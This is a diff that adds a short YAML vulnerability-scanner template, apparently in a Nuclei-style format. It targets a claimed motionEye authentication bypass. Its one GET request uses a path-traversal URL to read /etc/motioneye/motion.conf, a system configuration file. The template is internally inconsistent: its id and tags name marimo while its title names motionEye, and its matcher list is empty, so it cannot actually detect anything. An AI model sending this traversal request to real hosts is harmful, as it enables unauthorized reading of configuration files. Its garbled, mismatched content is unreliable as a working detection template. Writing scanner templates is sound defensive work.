@@ -1,0 +1,17 @@
+id: marimo-unauth
+brief:
+    title: motionEye Partial - Authentication Bypass
+    by: pussycat0x
+    level: critical
+    about: A path traversal vulnerability allows unauthenticated attackers to access protected resources and bypass authentication controls.
+    label:
+        - marimo
+        - unauth
+        - misconfig
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/movie/1/playback//etc/motioneye/motion.conf'
+      head:
+        Content-Type: application/json
+      signs: []
